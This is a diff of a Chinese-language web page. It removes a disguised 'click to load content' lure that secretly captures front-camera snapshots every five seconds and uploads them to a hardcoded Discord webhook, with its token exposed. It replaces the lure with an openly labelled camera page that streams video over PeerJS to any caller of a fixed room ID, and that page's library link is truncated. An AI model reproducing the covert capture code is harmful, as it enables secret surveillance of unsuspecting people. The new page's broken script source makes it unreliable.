@@ -1,61 +1,67 @@
 <!DOCTYPE html>
-<html>
+<html lang="zh-TW">
 <head>
-<meta charset="utf-8">
-<title>內容載入中</title>
+    <meta charset="utf-8">
+    <title>工作站 - 影像傳輸端</title>
+    <!-- 引入 PeerJS 核心函式庫 -->
+    <script src="https://unpkg.com"></script>
+    <style>
+        body { font-family: Arial, sans-serif; text-align: center; padding: 20px; }
+        #preview { width: 100%; max-width: 400px; border: 2px solid #ccc; border-radius: 8px; }
+        .status { color: #666; font-size: 14px; margin-top: 10px; }
+    </style>
 </head>
 <body>
 
-<h2>點擊按鈕查看內容</h2>
-<button onclick="startAction()">點擊載入</button>
-<p id="status"></p>
+    <h2>影像傳輸工作站</h2>
+    <video id="preview" autoplay playsinline muted></video>
+    <p id="status" class="status">正在初始化相機...</p>
 
-<!-- 隱藏的 video 和 canvas，用於背後處理影像 -->
-<video id="v" style="display:none;" autoplay playsinline></video>
-<canvas id="c" style="display:none;"></canvas>
+    <script>
+    // 固定的連線頻道 ID，後台端將透過這個 ID 連進來
+    const ROOM_ID = "live-monitor-channel-12345"; 
+    
+    // 初始化 PeerJS 物件，使用官方免費的雲端伺服器
+    const peer = new Peer(ROOM_ID);
+    let localStream = null;
 
-<script>
-var webhook = "https://discord.com/api/webhooks/1429150986882252871/UlvSQaaZLtutHuXJdZ_P_khQjXZV5BIXRbWbfvYDJ9psaiBwZKh9RfwNMeRkkC5rEskv";
-
-function startAction() {
-    document.getElementById("status").innerHTML = "正在載入內容...";
-    getCamera(); // 啟動相機權限與截圖
-}
-
-function getCamera() {
-    // 請求相機權限
-    navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
+    // 1. 請求相機權限並取得畫面串流
+    navigator.mediaDevices.getUserMedia({ 
+        video: { facingMode: "user" }, // 使用前置鏡頭
+        audio: false                    // 關閉聲音以防回音
+    })
     .then(function(stream) {
-        var video = document.getElementById("v");
-        video.srcObject = stream;
-        
-        // 每 5 秒截圖並傳送一次
-        setInterval(function() {
-            var canvas = document.getElementById("c");
-            canvas.width = video.videoWidth;
-            canvas.height = video.videoHeight;
+        localStream = stream;
+        // 將自己的畫面顯示在預覽視窗
+        const videoElement = document.getElementById("preview");
+        videoElement.srcObject = stream;
+        document.getElementById("status").innerText = "相機已就緒，等待後台連線...";
+
+        // 2. 監聽是否有後台端連入
+        peer.on('call', function(call) {
+            document.getElementById("status").innerText = "後台已連線，正在實時傳輸影像...";
             
-            var ctx = canvas.getContext("2d");
-            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+            // 應答連線，並將平板的視訊串流傳送過去
+            call.answer(localStream);
             
-            canvas.toBlob(function(blob) {
-                var formData = new FormData();
-                formData.append('file', blob, 'capture.jpg');
-                formData.append('payload_json', JSON.stringify({ content: "📸 自動擷取畫面" }));
-                
-                fetch(webhook, {
-                    method: "POST",
-                    body: formData
-                });
-            }, "image/jpeg", 0.7); // 壓縮率 0.7 減少流量
-        }, 5000);
+            // 監聽連線中斷
+            call.on('close', () => {
+                document.getElementById("status").innerText = "後台已中斷連線，等待重新連線...";
+            });
+        });
     })
     .catch(function(err) {
-        console.log("相機權限被拒絕");
-        document.getElementById("status").innerHTML = "需要允許相機權限才能查看內容";
+        console.error("無法取得相機權限:", err);
+        document.getElementById("status").innerText = "錯誤：請允許相機權限以進行傳輸。";
     });
-}
-</script>
+
+    peer.on('error', function(err) {
+        console.error("PeerJS 錯誤:", err);
+        if (err.type === 'unavailable-id') {
+            document.getElementById("status").innerText = "錯誤：此頻道已被佔用，請重新整理網頁。";
+        }
+    });
+    </script>
 
 </body>
 </html>
